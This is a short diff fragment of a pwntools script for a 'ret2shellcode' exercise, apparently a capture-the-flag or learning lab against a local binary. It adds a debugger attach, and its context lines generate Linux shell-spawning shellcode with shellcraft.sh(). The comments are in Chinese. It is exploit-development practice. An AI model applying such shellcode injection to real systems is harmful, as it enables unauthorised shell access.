@@ -173,6 +173,7 @@ context.binary = './ret2shellcode'  # context(os='linux', arch='i386')
 print(context)
 
 sh = process('./ret2shellcode')
+gdb.attach(sh)
 # shellcraft.i386.linux.sh()  #shellcraft.sh()
 shellcode = asm(shellcraft.sh())  # type(shellcraft.sh()): str 为汇编代码 # 构造自己的sh汇编码
 print("shellcode: ", type(shellcode), shellcode)
